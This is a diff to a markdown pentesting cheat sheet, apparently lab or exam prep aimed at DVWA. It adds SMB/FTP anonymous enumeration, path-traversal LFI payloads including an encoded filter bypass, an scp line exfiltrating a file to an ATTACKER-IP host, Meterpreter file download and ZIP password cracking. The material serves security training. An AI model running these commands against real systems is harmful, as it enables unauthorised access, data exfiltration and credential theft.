@@ -77,7 +77,33 @@
 
 
 #### Enumeration
-- enum4linux 10.10.60.11
+- If SMB (port 445) is open:
+````bash
+  #list shares:
+    nmap --script smb-enum-shares -p 445 <IP>
+    #Finds shared folders on a Windows/Linux machine.
+    #If the target allows anonymous access, you'll see default shared folders (C$, IPC$, ADMIN$)
+    smbclient -L //<TARGET-IP> -U anonymous -N
+  #-N → No password prompt (used for anonymous access checks) & If listed, access it:
+  smbclient //<TARGET-IP>/DVWA -U anonymous
+  #Then, download the file:
+  smb: \> get uploads/hash.txt
+````
+- enum4linux -U 10.10.60.11     #-U → users enumeration or try below
+- crackmapexec smb <IP> --users
+- Using FTP
+````bash
+  #If FTP (port 21) is open:
+  ftp <TARGET-IP>
+  #Try logging in with anonymous credentials:
+  User: anonymous
+  Password: (leave blank)
+  
+  ftp> ls
+  #Navigate to DVWA/uploads/ and get the file:
+  ftp> cd DVWA/uploads/
+  ftp> get hash.txt
+````
 - smbmap
   ````
   smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
@@ -198,6 +224,15 @@ Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --colum
 // extract data of the table and the column inside of the db
 sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
 ````
+Local File Inclusion (LFI) Attack (If Web App is Vulnerable)
+````html
+  <!--If the website is vulnerable to LFI, try:-->
+  http://<TARGET-IP>/vulnerable.php?file=../../DVWA/uploads/hash.txt
+  <!--Or try Windows-style LFI:-->
+  http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/drivers/etc/hosts
+  <!--If the app is filtering ../, use URL encoding:-->
+  http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
+````
 
 <details><summary> ⏬ DVWA</summary>
 Basic Commands
@@ -220,7 +255,24 @@ Read Files & user info (Sensitive Info)
   query user    #View Active Logged-in Users
   net user /domain    #View Domain Users
 ````
-  
+Get the file:
+- Try Accessing via a Web Browser (If DVWA Has File Access)
+````js
+  http://<TARGET-IP>/DVWA/uploads/hash.txt
+  //If the file is accessible, you can download it directly.
+````
+- LFI via web [browser](#web-explotation)
+- using [smb](#enumeration)
+- using [ftp](#enumeration)
+- Windows:
+    If you have Command Injection or an RCE shell, use:
+    ````bash
+    type C:\DVWA\uploads\hash.txt    #CMD (Windows)
+    Get-Content C:\DVWA\uploads\hash.txt     #powershell
+    scp C:\DVWA\uploads\hash.txt attacker@<ATTACKER-IP>:/home/kali/     #To transfer the file to your system
+    
+    meterpreter > download C:\\DVWA\\uploads\\hash.txt .   #If you have Meterpreter, download the file
+    ````
 Check Network & Connections
 ````bash
   #Linux:
@@ -297,7 +349,21 @@ Symmetric Encryption: Use same key for Encryption and decryption
 Asymmetric Encryption: Use Public/Private for Encryption and Decryption
 
 ##### Hashing/decoding
-
+To find the password of a ZIP file
+````bash
+  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
+  #-v → Verbose mode (show progress).
+  #-u → Tries to unzip to verify correct password.
+  #-D → Dictionary attack mode.
+  #-p rockyou.txt → Uses RockYou wordlist (common passwords).
+  #with john
+    zip2john <zipfile.zip> > hash.txt        #First, extract the ZIP hash
+    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        #Then, crack it using rockyou.txt
+    hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force        #OR use hashcat (mode 13600 for ZIP)
+    john --show hash.txt      #To see the cracked password
+  #If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
+    unzip -P "" <zipfile.zip>
+````
 To decrypt (crack) a hashed password:
 - Online:
 
